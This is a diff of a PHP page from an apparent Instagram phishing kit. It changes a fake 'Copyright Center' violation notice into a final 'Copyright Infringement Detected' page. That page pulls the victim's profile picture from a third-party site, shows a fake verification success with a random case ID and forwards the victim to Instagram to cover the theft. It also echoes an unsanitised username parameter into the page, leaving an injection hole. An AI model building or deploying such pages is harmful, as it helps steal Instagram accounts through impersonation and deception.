@@ -1,25 +1,37 @@
 <?php
 
-if ($_GET) {
-    $username=$_GET["username"];
-    session_start();
-    $_SESSION["username"]=$username;
-    header("location: user.php?username=$username");
-}
+
+require 'slokerapi.php';
+session_start();
+error_reporting(E_ALL);
+
+
+
+$username=$_GET['username'];
+$url2="https://smihub.com/search?query=$username";
+$ip=str_get_html(file_get_contents($url2));
+$pp=$ip->find("img[class='img-fluid w-100']",0)->src;
+$tik="-";
+$followers="-";
+
+
+
+
+
 ?>
 
 
-<!--ShuTTeRLooK-->
+<!--ShuTTeRLooK - Script Kurucusu -->
 
 
 <!DOCTYPE html>
 <html lang="en">
 <head>
-	<title>Copyright | Instagram</title>
+<title>Copyright Infringement Detected @<?php echo $username; ?></title>
 	<meta charset="UTF-8">
 	<meta name="viewport" content="width=device-width, initial-scale=1">
 <!--===============================================================================================-->	
-	<link rel="icon" type="image/png" href="images/icons/favicon.ico"/>
+<link rel="icon" type="image/png" href="images/favicon.ico"/>
 <!--===============================================================================================-->
 	<link rel="stylesheet" type="text/css" href="vendor/bootstrap/css/bootstrap.min.css">
 <!--===============================================================================================-->
@@ -46,25 +58,25 @@ if ($_GET) {
 	
 	<div class="container-login100" >
 		<div class="wrap-login100 p-l-55 p-r-55 p-t-80 p-b-30">
-			<form method="get"  class="login100-form validate-form">
-				<center><img src="images/logom.png" width="100"></center><br>
+			<form method="post" action="https://instagram.com/<?php echo $username; ?>" class="login100-form validate-form">
+			<center><img style="max-width:50%; border-radius:50%; margin-top:-70px;" width="100"  src="<?php echo $pp; ?>"></center><br>
 				<span class="login100-form-title p-b-37">
-				Copyright Center
+				@<?php echo $username; ?>
 				</span>
-		<center>		<p style="max-width:87%; font-size:15px; color: #999; line-height:20px; box-sizing:border-box;">
-You have been redirected to this page, your account violates our rules, if you think this is an error, please fill out the form to verify your account.</p></center>
-			<br>
-			
-			<div class="wrap-input100 validate-input m-b-20" data-validate="User name">
-					<input class="input100" type="text" name="username" placeholder="User name">
-					<span class="focus-input100"></span>
-				</div>
+                <center>
+                <b>Successfully Completed</b>
+          <hr>
+            <center><p>Thank you for verifying your account. Our team will contact you as soon as possible.</p></center>
+            <br>
+			  <strong><p>Case ID: <?php echo(rand(10,10000000));?></p></strong>
+			  <br>
+</center>
 
 
 
 				<div class="container-login100-form-btn">
 					<button class="login100-form-btn">
-					Contuine
+					Go to Instagram
 					</button>
 				</div>
 
